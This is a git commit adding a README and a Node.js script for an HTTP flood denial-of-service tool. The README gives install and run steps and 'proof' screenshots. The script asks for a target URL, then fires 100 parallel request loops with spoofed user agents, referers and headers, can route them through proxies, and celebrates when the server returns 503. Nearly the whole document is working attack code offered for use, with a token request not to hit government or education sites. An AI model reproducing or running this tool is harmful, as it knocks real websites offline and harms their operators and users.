d9bca90cf03b77f6dde9bd77c3f93a0482d21379
TNT <139092950+TNTxTrick@users.noreply.github.com>
2024-11-21 14:27:59 +0000

    Initial commit

---
+++ README.md
@@ -0,0 +1,26 @@
+# DDOS
+This is a DDoS attack made by joshua Apostol if you wan't to use this ddos attack please do not attack the gov and edu website.
+
+## TESTED ON
+Termux ✅️
+replit✅️
+cloudshell✅️
+
+# INSTALLATION
+```
+npm install axios && socks-proxy-agent && https-proxy-agent && readline
+```
+```
+git clone https://github.com/joshuaApostol2/Nash-ddos
+```
+```
+cd Nash-ddos
+```
+```
+node index.js
+```
+
+## PROOF
+<img src="proof/burat.jpg" alt="Description of image" style="width: 100%; height: auto; max-width: 300px; aspect-ratio: 9 / 16;">
+
+<img src="proof/Screenshot_20240929_124022_Chrome.jpg" alt="Description of image" style="width: 100%; height: auto; max-width: 300px; aspect-ratio: 9 / 16;">
---
+++ index.js
@@ -0,0 +1,221 @@
+const axios = require('axios');
+const fs = require('fs');
+const SocksProxyAgent = require('socks-proxy-agent');
+const HttpsProxyAgent = require('https-proxy-agent');
+const readline = require('readline');
+
+const proxyF = "proxy.txt";
+const uaLF = "ua.txt";
+
+const userAgents = [
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52",
+    "Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52",
+    "Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537 .36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+];
+
+const langHeader = [
+    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
+    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
+    "en-US,en;q=0.5",
+    "en-US,en;q=0.9",
+    "de-CH;q=0.7",
+    "da, en -gb;q=0.8, en;q=0.7",
+    "cs;q=0.5",
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.9",
+    "en-CA,en;q=0.9",
+    "en-AU,en;q=0.9",
+    "en-NZ,en;q=0.9",
+    "en-ZA,en;q=0.9"
+];
+
+const refers = [
+    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
+    "http://coccoc.com/search#query=",
+    "http://ddosvn.somee.com/f5.php?v=",
+    "http://engadget.search.aol.com/search?q=",
+    "http://engadget.search.aol.com/search?q=query?=query=&q=",
+    "http://eu.battle.net/wow/en/search?q=",
+    "http://filehippo.com/search?q=",
+    "http://funnymama.com/search?q=",
+    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
+    "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
+    "http://go.mail.ru/search?mail.ru=1&q=",
+    "http://help.baidu.com/searchResult?keywords="
+];
+
+const cplist = [
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384 :ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256 :ECDHE -RSA-AES128-SHA:E CDHE-ECDSA-AES128-S HA :ECDHE -RSA-AES256 -SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
+];
+
+const acceptHeader = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+];
+
+function readProxy() {
+    try {
+        const data = fs.readFileSync(proxyF, "utf8");
+        return data.trim().split("\n").map((line) => line.trim());
+    } catch (error) {
+        console.error(`Failed to read proxy list: ${error}`);
+        return [];
+    }
+}
+
+function readUA() {
+    try {
+        const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
+        return data.map((line) => line.trim());
+    } catch (error) {
+        console.error(`Failed to read user agent list: ${error}`);
+        return [];
+    }
+}
+
+function sanitizeUA(userAgent) {
+    return userAgent.replace(/[^\x20-\x7E]/g, "");
+}
+
+function randElement(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+}
+
+const delay = 0;
+
+function sendReq(target, agent, userAgent) {
+    const sanitizedUserAgent = sanitizeUA(randElement(userAgents));
+    const headers = {
+        "User-Agent": sanitizedUserAgent,
+        Accept: randElement(acceptHeader),
+        "Accept-Encoding": randElement(encodingHeader),
+        "Accept-Language": randElement(langHeader),
+        Referer: randElement(refers),
+        "Cache-Control": randElement(cplist),
+        DNT: "1",
+        Connection: "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        TE: "Trailers",
+    };
+
+    axios
+        .get(target, { httpAgent: agent, headers: headers, timeout: 0 })
+        .then((_) => {
+            setTimeout(() => sendReq(target, agent, userAgent), 0);
+        })
+        .catch((error) => {
+            if (error.response && error.response.status === 503) {
+                console.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
+            } else if (error.response && error.response.status === 502) {
+                console.log("Error: Request failed with status code 502");
+            } else {
+                console.log("Error: " + error.message);
+            }
+            setTimeout(() => sendReq(target, agent, userAgent), 0);
+        });
+}
+
+function sendReqs(targetUrl) {
+    const proxies = readProxy();
+    const userAgentsList = readUA();
+
+    if (proxies.length > 0) {
+        const proxy = randElement(proxies);
+        const proxyParts = proxy.split(":");
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const agent = proxyProtocol === "socks5"
+            ? new SocksProxyAgent(proxyUrl)
+            : new HttpsProxyAgent(proxyUrl);
+
+        sendReq(targetUrl, agent, randElement(userAgentsList));
+    } else {
+        sendReq(targetUrl, null, randElement(userAgentsList));
+    }
+}
+
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+console.log('\x1b[31m' +
+`██████╗ ██████╗  ██████╗ ███████╗
+██╔══██╗██╔══██╗██╔═══██╗██╔════╝
+██║  ██║██║  ██║██║   ██║███████╗
+██║  ██║██║  ██║██║   ██║╚════██║
+██████╔╝██████╔╝╚██████╔╝███████║
+╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
+
+` + '\033[38;5;196m───────────────────────────────────────────\n' +
+'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m VERSION  \033[38;5;196m : \033[38;5;46m2.2\n' +
+'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m AUTHOR   \033[38;5;196m : \033[38;5;46mJoshua Apostol\n' +
+'\033[38;5;196m───────────────────────────────────────────\n' +
+'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Government Websites\n' +
+'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Education Websites\n───────────────────────────────────────────\x1b[0m');
+
+function askForUrl() {
+    rl.question(`\x1b[31m┌─[ \x1b[32m[TARGET URL]\x1b[31m ]─────[ # ]\x1b[0m\n\x1b[31m└─[ \x1b[32m\W\x1b[31m ]────► \x1b[0m`, (url) => {
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            console.log("Vui lòng nhập url.");
+            askForUrl();
+        } else {
+            console.log("\033[38;5;196m");
+            console.log("===========================================");
+            console.log("        DDoS now flooding the server");
+            console.log("===================KIFFY===================");
+            console.log("\033[0m");
+            let continueAttack = true;
+            const maxRequests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+            const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+
+            const attack = () => {
+                try {
+                    if (!continueAttack) return;
+
+                    const userAgent = randElement(userAgents);
+                    const headers = {
+                        'User-Agent': userAgent
+                    };
+
+                    axios.get(url, { headers })
+                        .then((response) => {
+                            if (response.status === 503) {
+                            }
+                        })
+                        .catch((error) => {
+                            if (error.response && error.response.status === 502) {
+                            }
+                        });
+
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                } catch (error) {
+                    console.log("Error: " + error.message);
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                }
+            };
+
+            const numThreads = 100;
+            for (let i = 0; i < numThreads; i++) {
+                attack();
+            }
+
+            setTimeout(() => {
+                continueAttack = false;
+                console.log('Max requests reached.');
+                askForUrl();
+            }, maxRequests / requestsPerSecond * 1000);
+        }
+    });
+}
+
+askForUrl(); 
